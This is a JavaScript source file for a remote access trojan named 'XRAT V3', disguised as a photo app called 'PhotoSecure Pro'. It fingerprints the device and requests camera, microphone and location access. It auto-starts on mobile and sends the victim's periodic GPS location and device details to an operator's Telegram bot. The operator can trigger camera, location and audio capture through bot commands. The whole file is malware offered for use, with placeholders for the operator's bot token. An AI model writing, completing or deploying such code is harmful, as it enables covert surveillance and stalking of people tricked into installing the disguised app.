// ==================== XRAT V3 CORE SYSTEM ====================
// Telegram Configuration - GANTI INI!
const CONFIG = {
    BOT_TOKEN: "GANTI_DENGAN_TOKEN_BOT_KAMU",      // Dari @BotFather
    CHAT_ID: "GANTI_DENGAN_CHAT_ID_KAMU",          // Chat ID Telegram kamu
    VERSION: "3.0.0",
    APP_NAME: "PhotoSecure Pro",
    AUTO_START: true,
    DEBUG_MODE: true
};

// Global State
let deviceInfo = {};
let services = {};
let isActive = false;

// ==================== INITIALIZATION ====================
window.initializeXRAT = function() {
    console.log('🚀 XRAT V3 Initializing...');
    
    // Collect device info
    deviceInfo = {
        uuid: generateUUID(),
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        cores: navigator.hardwareConcurrency || 'unknown',
        memory: navigator.deviceMemory || 'unknown',
        timestamp: new Date().toISOString()
    };
    
    // Start permission requests
    requestAllPermissions();
    
    // Initialize services
    initializeServices();
    
    // Send startup notification
    sendStartupNotification();
    
    isActive = true;
    updateUIStatus('active');
    
    console.log('✅ XRAT V3 Activated');
};

// ==================== PERMISSION HANDLER ====================
function requestAllPermissions() {
    console.log('🔐 Requesting permissions...');
    
    const permissions = [
        { name: 'camera', method: requestCamera },
        { name: 'location', method: requestLocation },
        { name: 'microphone', method: requestMicrophone },
        { name: 'notifications', method: requestNotifications },
        { name: 'storage', method: requestStorage }
    ];
    
    let index = 0;
    function requestNext() {
        if (index < permissions.length) {
            const perm = permissions[index];
            console.log(`Requesting ${perm.name}...`);
            perm.method().then(() => {
                console.log(`✅ ${perm.name} granted`);
                index++;
                requestNext();
            }).catch(err => {
                console.log(`⚠️ ${perm.name} denied:`, err);
                index++;
                requestNext();
            });
        } else {
            console.log('✅ All permissions processed');
        }
    }
    
    requestNext();
}

function requestCamera() {
    return new Promise((resolve, reject) => {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    stream.getTracks().forEach(track => track.stop());
                    resolve();
                })
                .catch(reject);
        } else {
            resolve();
        }
    });
}

function requestLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                () => resolve(),
                reject,
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            resolve();
        }
    });
}

function requestMicrophone() {
    return new Promise((resolve, reject) => {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    stream.getTracks().forEach(track => track.stop());
                    resolve();
                })
                .catch(reject);
        } else {
            resolve();
        }
    });
}

function requestNotifications() {
    return new Promise((resolve) => {
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission().then(resolve);
        } else {
            resolve();
        }
    });
}

function requestStorage() {
    return new Promise((resolve) => {
        // Try to access localStorage
        try {
            localStorage.setItem('test_storage', 'ok');
            localStorage.removeItem('test_storage');
            resolve();
        } catch (e) {
            resolve(); // Continue anyway
        }
    });
}

// ==================== SERVICE MANAGEMENT ====================
function initializeServices() {
    services = {
        locationTracker: {
            active: false,
            interval: null,
            start: function() {
                this.active = true;
                this.interval = setInterval(trackLocation, 300000); // 5 minutes
                console.log('📍 Location tracking started');
            },
            stop: function() {
                clearInterval(this.interval);
                this.active = false;
            }
        },
        
        mediaScanner: {
            active: false,
            interval: null,
            start: function() {
                this.active = true;
                this.interval = setInterval(scanMediaFiles, 600000); // 10 minutes
                console.log('🖼️ Media scanner started');
            },
            stop: function() {
                clearInterval(this.interval);
                this.active = false;
            }
        },
        
        telegramListener: {
            active: false,
            interval: null,
            start: function() {
                this.active = true;
                this.interval = setInterval(checkTelegramCommands, 30000); // 30 seconds
                console.log('🤖 Telegram listener started');
            },
            stop: function() {
                clearInterval(this.interval);
                this.active = false;
            }
        }
    };
    
    // Start all services
    Object.values(services).forEach(service => service.start());
}

// ==================== CORE FUNCTIONS ====================
function trackLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const locationData = {
                    type: 'location',
                    device_id: deviceInfo.uuid,
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                
                sendToTelegram('📍 Location Update', locationData);
            },
            error => console.log('Location error:', error),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }
}

function scanMediaFiles() {
    console.log('🔄 Scanning for media files...');
    
    // This would normally access file system
    // For web, we can only notify
    const scanData = {
        type: 'media_scan',
        device_id: deviceInfo.uuid,
        timestamp: new Date().toISOString(),
        status: 'scan_initiated'
    };
    
    sendToTelegram('🖼️ Media Scan Started', scanData);
}

// ==================== TELEGRAM INTEGRATION ====================
function sendStartupNotification() {
    const message = `
🚀 *${CONFIG.APP_NAME} V${CONFIG.VERSION} ACTIVATED*

📱 *Device Information:*
• UUID: \`${deviceInfo.uuid}\`
• Platform: ${deviceInfo.platform}
• Screen: ${deviceInfo.screen}
• Language: ${deviceInfo.language}
• Timezone: ${deviceInfo.timezone}

🛠️ *System Status:*
• Services: ✅ ACTIVE
• Permissions: ✅ GRANTED
• Connection: ✅ ONLINE

📍 *Initial Location:* Pending...

⏰ *Start Time:* ${new Date().toLocaleString()}

✅ *Ready for commands. Send /help for menu.*
    `;
    
    sendToTelegram(message);
}

function sendToTelegram(title, data) {
    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN.includes('GANTI')) {
        console.log('⚠️ Bot token not configured');
        return;
    }
    
    let message = `*${title}*\n\n`;
    message += `📱 Device: ${deviceInfo.uuid}\n`;
    message += `⏰ Time: ${new Date().toLocaleString()}\n\n`;
    
    if (typeof data === 'object') {
        message += '```json\n' + JSON.stringify(data, null, 2) + '\n```';
    } else {
        message += data;
    }
    
    const payload = {
        chat_id: CONFIG.CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
    };
    
    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(error => {
        console.log('Telegram send error:', error);
    });
}

function checkTelegramCommands() {
    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN.includes('GANTI')) return;
    
    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1`)
        .then(response => response.json())
        .then(data => {
            if (data.ok && data.result.length > 0) {
                const update = data.result[data.result.length - 1];
                if (update.message && update.message.text) {
                    const command = update.message.text.trim();
                    const chatId = update.message.chat.id.toString();
                    
                    if (chatId === CONFIG.CHAT_ID) {
                        processCommand(command, update.message.message_id);
                    }
                }
            }
        })
        .catch(error => console.log('Telegram fetch error:', error));
}

function processCommand(command, messageId) {
    console.log('Processing command:', command);
    
    let response = '';
    
    switch(command.toLowerCase()) {
        case '/start':
        case '/status':
            response = generateStatusReport();
            break;
            
        case '/photo':
            takePhoto();
            response = '📸 Taking photo...';
            break;
            
        case '/location':
            getCurrentLocation();
            response = '📍 Getting current location...';
            break;
            
        case '/screenshot':
            response = '🖥️ Screenshot feature requires native app';
            break;
            
        case '/audio':
            recordAudio(10);
            response = '🎤 Recording 10 seconds audio...';
            break;
            
        case '/files':
            response = '📁 File list feature requires native access';
            break;
            
        case '/help':
            response = generateHelpMenu();
            break;
            
        default:
            if (command.startsWith('/')) {
                response = `❓ Unknown command: ${command}\nType /help for commands`;
            }
    }
    
    if (response) {
        sendTelegramResponse(messageId, response);
    }
}

function sendTelegramResponse(replyToMessageId, text) {
    const payload = {
        chat_id: CONFIG.CHAT_ID,
        text: text,
        reply_to_message_id: replyToMessageId,
        parse_mode: 'Markdown'
    };
    
    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

// ==================== UTILITY FUNCTIONS ====================
function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function generateStatusReport() {
    return `
📊 *SYSTEM STATUS REPORT*

🆔 Device ID: \`${deviceInfo.uuid}\`
📱 Platform: ${deviceInfo.platform}
🌐 User Agent: ${deviceInfo.userAgent.substring(0, 50)}...
🖥️ Screen: ${deviceInfo.screen}
🗣️ Language: ${deviceInfo.language}
🕐 Timezone: ${deviceInfo.timezone}

⚙️ *Services Status:*
• Location Tracking: ${services.locationTracker.active ? '✅ ACTIVE' : '❌ INACTIVE'}
• Media Scanner: ${services.mediaScanner.active ? '✅ ACTIVE' : '❌ INACTIVE'}
• Telegram Listener: ${services.telegramListener.active ? '✅ ACTIVE' : '❌ INACTIVE'}

📈 *Uptime:* ${Math.floor(performance.now() / 1000)} seconds

🔋 *Battery Status:* ${navigator.getBattery ? 'Check pending' : 'API not available'}

✅ *System:* OPERATIONAL
    `;
}

function generateHelpMenu() {
    return `
🤖 *XRAT V3 COMMAND MENU*

📊 *Info Commands:*
/start - Start system
/status - Check system status
/help - Show this menu

🎮 *Control Commands:*
/photo - Take photo with camera
/location - Get current location
/audio - Record 10 second audio
/screenshot - Capture screen (native only)

⚙️ *System Commands:*
/files - List accessible files
/contacts - Access contacts (native only)
/sms - Access SMS (native only)

⚠️ *Note:* Some commands require native app permissions
    `;
}

function takePhoto() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg');
                    sendToTelegram('📸 Camera Photo Captured', { 
                        type: 'photo_capture',
                        timestamp: new Date().toISOString(),
                        resolution: `${canvas.width}x${canvas.height}`
                    });
                    
                    // Stop stream
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            })
            .catch(error => {
                sendToTelegram('❌ Camera Error', { error: error.message });
            });
    }
}

function getCurrentLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const locationData = {
                    type: 'location_command',
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy + ' meters',
                    timestamp: new Date().toISOString(),
                    map_url: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
                };
                
                sendToTelegram('📍 Current Location', locationData);
            },
            error => {
                sendToTelegram('❌ Location Error', { error: error.message });
            },
            { enableHighAccuracy: true }
        );
    }
}

function recordAudio(duration) {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                sendToTelegram('🎤 Audio Recording Started', { 
                    duration: duration + ' seconds',
                    timestamp: new Date().toISOString()
                });
                
                setTimeout(() => {
                    stream.getTracks().forEach(track => track.stop());
                    sendToTelegram('✅ Audio Recording Complete', {
                        duration: duration + ' seconds',
                        timestamp: new Date().toISOString()
                    });
                }, duration * 1000);
            })
            .catch(error => {
                sendToTelegram('❌ Audio Error', { error: error.message });
            });
    }
}

function updateUIStatus(status) {
    const statusDot = document.getElementById('statusDot');
    const statusText = document.getElementById('statusText');
    const serviceStatus = document.getElementById('serviceStatus');
    
    if (status === 'active') {
        statusDot.className = 'status-dot online';
        statusText.textContent = 'System Active';
        
        if (serviceStatus) {
            serviceStatus.innerHTML = `
                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 15px;">
                    <div style="background: rgba(76, 175, 80, 0.2); padding: 10px; border-radius: 8px;">
                        <strong>📍 Location</strong><br>
                        <span style="color: #4CAF50;">✅ Active</span>
                    </div>
                    <div style="background: rgba(33, 150, 243, 0.2); padding: 10px; border-radius: 8px;">
                        <strong>🖼️ Media Scan</strong><br>
                        <span style="color: #2196F3;">✅ Active</span>
                    </div>
                    <div style="background: rgba(156, 39, 176, 0.2); padding: 10px; border-radius: 8px;">
                        <strong>🤖 Telegram</strong><br>
                        <span style="color: #9C27B0;">✅ Connected</span>
                    </div>
                    <div style="background: rgba(255, 193, 7, 0.2); padding: 10px; border-radius: 8px;">
                        <strong>🆔 Device ID</strong><br>
                        <code style="font-size: 0.8rem;">${deviceInfo.uuid}</code>
                    </div>
                </div>
            `;
        }
    }
}

// ==================== AUTO-START ====================
// Auto-initialize in APK mode
if (window.cordova || /Android|iPhone|iPad/.test(navigator.userAgent)) {
    document.addEventListener('DOMContentLoaded', function() {
        setTimeout(() => {
            if (CONFIG.AUTO_START) {
                console.log('📱 APK mode detected, auto-starting...');
                if (typeof initializeXRAT === 'function') {
                    initializeXRAT();
                }
            }
        }, 3000);
    });
}

// Export for global access
window.xrat = {
    initialize: initializeXRAT,
    config: CONFIG,
    device: deviceInfo,
    services: services,
    sendToTelegram: sendToTelegram
};

console.log('🔥 XRAT V3 Core Loaded');